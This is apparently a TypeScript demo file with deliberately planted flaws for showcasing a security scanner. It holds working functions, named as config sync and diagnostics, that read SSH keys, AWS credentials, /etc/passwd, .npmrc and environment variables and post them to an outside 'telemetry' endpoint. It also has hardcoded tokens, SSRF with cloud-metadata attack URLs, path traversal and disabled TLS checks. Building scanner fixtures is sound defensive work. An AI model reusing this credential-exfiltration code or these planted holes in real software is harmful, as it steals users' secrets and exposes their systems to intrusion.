/**
 * DEMO FILE — intentional vulnerabilities for security scanner showcase.
 *
 * CWE findings  : CWE-22 (Path Traversal), CWE-918 (SSRF), CWE-295 (TLS bypass),
 *                 CWE-798 (Hardcoded token)
 * Exfiltration  : taint — reads local config files + env vars → external endpoint
 * Secrets       : service token hardcoded; endpoint URL with embedded credentials
 */

import axios  from 'axios';
import fs     from 'fs';
import path   from 'path';
import os     from 'os';
import https  from 'https';

// SECRETS — service token hardcoded; visible in git history even if later removed
const TELEMETRY_URL   = 'https://usage-telemetry.saas-platform.io/collect';
const SERVICE_TOKEN   = 'Bearer svc_prod_xK9mN2pL8qR5tW3vY7zA4cF6hJ1bM0nP9qR2sT5';
const INTERNAL_API    = 'https://admin:Sup3rS3cr3t@internal-api.acmecorp.io/v1'; // Credentials in URL

// EXFILTRATION — taint: local sensitive filesystem data → external telemetry endpoint
// Source: /etc/app/ config files + process.env with cloud credentials
// Sink  : TELEMETRY_URL (external, third-party)
export async function syncConfiguration(configPath: string): Promise<void> {
  // CWE-22: Path traversal — configPath not validated against base directory
  const absolutePath = path.join('/etc/app', configPath);
  const configData   = fs.readFileSync(absolutePath, 'utf-8');

  const envSecrets = {
    NODE_ENV    : process.env.NODE_ENV,
    DATABASE_URL: process.env.DATABASE_URL,  // Often contains DB credentials
    SECRET_KEY  : process.env.SECRET_KEY,
    AWS_ACCESS  : process.env.AWS_ACCESS_KEY_ID,
    AWS_SECRET  : process.env.AWS_SECRET_ACCESS_KEY,
  };

  // Taint flows into axios.post — data leaves the process boundary
  await axios.post(TELEMETRY_URL, {
    config     : configData,
    environment: envSecrets,
    hostname   : os.hostname(),
    npmConfig  : fs.existsSync(path.join(os.homedir(), '.npmrc'))
                   ? fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf-8')
                   : undefined,
  }, {
    headers: { Authorization: SERVICE_TOKEN },
  });
}

// CWE FINDING — CWE-918: SSRF; caller supplies arbitrary URL
// Attack: webhookUrl = "http://169.254.169.254/latest/meta-data/" (AWS metadata)
//         or         = "http://10.0.0.1/admin" (internal network pivot)
export async function fetchWebhookData(webhookUrl: string): Promise<unknown> {
  // No allowlist, no private IP range block, no scheme restriction
  const response = await axios.get(webhookUrl, { timeout: 5000 });
  return response.data;
}

// CWE FINDING — CWE-295: TLS certificate validation disabled
// Allows MITM attacks on production traffic; treats self-signed certs as valid
export async function fetchInternal(url: string): Promise<string> {
  const agent    = new https.Agent({ rejectUnauthorized: false }); // Disables chain + hostname check
  const response = await axios.get(url, { httpsAgent: agent });
  return response.data as string;
}

// EXFILTRATION — reads SSH keys + cloud credentials, sends to external endpoint
export async function reportDiagnostics(userId: string): Promise<void> {
  const sensitiveFiles: Record<string, string | null> = {};
  const targets = [
    path.join(os.homedir(), '.ssh', 'id_rsa'),
    path.join(os.homedir(), '.aws', 'credentials'),
    '/etc/passwd',
  ];
  for (const t of targets) {
    try { sensitiveFiles[t] = fs.readFileSync(t, 'utf-8'); } catch { sensitiveFiles[t] = null; }
  }

  await axios.post(`${TELEMETRY_URL}/diag`, {
    userId,
    sensitiveFiles,
    allEnvVars: process.env,
  }, { headers: { Authorization: SERVICE_TOKEN } });
}
